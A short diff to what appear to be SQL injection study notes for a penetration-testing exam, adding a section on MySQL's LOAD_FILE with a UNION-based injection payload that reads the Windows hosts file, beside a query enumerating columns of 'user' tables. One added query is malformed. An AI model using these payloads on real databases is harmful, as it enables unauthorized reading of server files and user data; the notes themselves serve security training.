@@ -59,6 +59,14 @@ Find all ```user``` tables in DBs
 SELECT group_concat(column_name) FROM information_schema.columns where table_name = 'user';
 ```
 
+[Load file](https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_load-file): we need FILE privilege
+
+```MySQL
+SELECT * LOAD_FILE('C:\Windows\System32\drivers\etc\hosts')
+/* table contains columns */
+x' UNION SELECT 1, LOAD_FILE('C:\Windows\System32\drivers\etc\hosts'),3-- -
+```
+
 ### :no_entry: sqlmap (:radioactive::radioactive::radioactive: cannot be used in the exam)
 
 ```
